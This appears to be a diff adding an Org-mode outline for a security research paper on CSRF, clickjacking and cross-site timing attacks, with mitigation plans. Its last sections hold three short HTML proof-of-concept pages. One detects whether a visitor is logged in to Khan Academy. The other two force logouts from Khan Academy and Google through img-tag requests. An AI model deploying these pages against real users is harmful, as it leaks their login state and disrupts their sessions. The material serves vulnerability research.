@@ -1,0 +1,76 @@
+* Paper Outline
+** Title
+- Summary of Abstract
+** Abstract
+1/2 page
+- Summary of Intro
+** Introduction
+2-3 pages
+- Summary of paper
+- Motivation
+- Related Work
+- 
+** Motivation(Pitch)
+- Why is it important
+** Related Work
+** Method and Technique
+- What is FIM
+- How we modeled it alloy
+- Implementation of experiment
+- Conclusion
+- Future Outlook
+* Experiment
+** Generic
+*** Vulnerabilities Check
+**** CSRF
+**** Click jacking
+**** cross site timing attack
+- Mitigate atacks using corp extension. 
+how: 
+- fix one website, then based on e
+*** Mitigation tests
+- using corp extension
+** 
+
+* Mitigation
+
+* TODO 
+- Login with google websites
+- find a vulnerable endpoint
+- vlabs end points
+
+* Robin Linus
+- all the websits which use FIM, are vulnerable to click jacking which they are
+  on the robin linus site.
+
+
+
+* Attack 1 : Cross-Site Timing Attack
+- Use with Khanacademy: if logged in logo will show up else not;.
+#+BEGIN_SRC html :tangle khanacademychecklogin.html
+<html>
+  <head><title>Khanacademy Check Login Attack</title></head>
+  <body>
+    <img src="https://www.khanacademy.org/login?continue=%2Ffavicon.ico"/>
+  </body>
+  
+</html>
+#+END_SRC
+* Attack Khanacademy Logout:
+#+BEGIN_SRC html :tangle khanacademylogout.html
+<html>
+<head><title>Khanacademy Logout Attack</title></head>
+<body>
+<img src="https://khanacademy.org/logout?contine=/"/>
+</body>
+</html>
+#+END_SRC
+* Attack Google Logout
+#+BEGIN_SRC html :tangle googlelogout.html
+<html>
+<head><title>Google Logout Attack</title></head>
+<body>
+<img src="https://accounts.google.com/logout"/>
+</body>
+</html>
+#+END_SRC
